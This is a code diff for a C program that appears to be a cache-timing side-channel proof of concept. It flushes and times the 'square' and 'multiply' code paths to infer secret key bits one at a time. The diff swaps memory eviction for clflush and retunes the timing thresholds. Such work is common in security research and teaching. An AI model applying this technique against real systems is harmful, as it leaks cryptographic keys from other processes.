@@ -12,9 +12,8 @@
 #include <string.h>
 #include <x86intrin.h>
 
-const int T_multiply = 0x1280;
-const int T_square = 0x1200;
-char evict[1024*1024];
+const int T_multiply = 0x1210;
+const int T_square = 0x11e7;
 int i = 0;
 int j = 0;
 
@@ -47,12 +46,13 @@ int main (int argc, char *argv[]){
     uint64_t sum;
 
     while(i<8) {
-        // evict multiply from cache by accessing lots of memory
-        char evict[1024*1024];
-        for (int k = 0; k < 1024*1024; k+=64) evict[k] = 1;
-       
-
+        _mm_clflush(square);
+        _mm_clflush(multiply);
    
+        for (volatile int i = 0; i < 100000; i++);
+        sum = 0;
+        j = 0;
+  
             uint64_t t0 = rdtsc_begin();
             volatile char v = *square;
             uint64_t t1 = rdtsc_end();        
@@ -66,14 +66,13 @@ int main (int argc, char *argv[]){
         
         printf("time_square: %lu, time_multiply: %lu\n", time_square, time_multiply);
 
-        if (time_multiply < 800) {
-            printf("bit %d is: %d\n", i, 1);
+        if (time_multiply > 280) {
+            printf("bit %d is: %d\n", i, 0);
         }
         else {
-            printf("bit %d is: %d\n", i, 0);
+            printf("bit %d is: %d\n", i, 1);
         } 
     i ++;
     }
         
 }
-
